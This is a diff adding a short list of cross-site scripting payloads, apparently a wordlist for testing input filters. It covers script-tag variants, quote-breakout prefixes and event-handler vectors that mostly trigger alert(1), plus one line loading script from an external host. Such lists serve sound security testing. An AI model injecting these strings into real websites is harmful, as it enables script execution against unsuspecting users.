@@ -1,0 +1,26 @@
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script >alert(1)</script>
+<script	>alert(1)</script>
+<script/src=//xss.rocks/xss.js></script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img/src=x/onerror=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>
+<img src="x" onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<SVG ONLOAD=alert(1)>
+<svg onload="alert(1)">
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+<video onerror=alert(1) src=x>
+<audio onerror=alert(1) src=x>
+<details ontoggle=alert(1)>
+<marquee onstart=alert(1)>
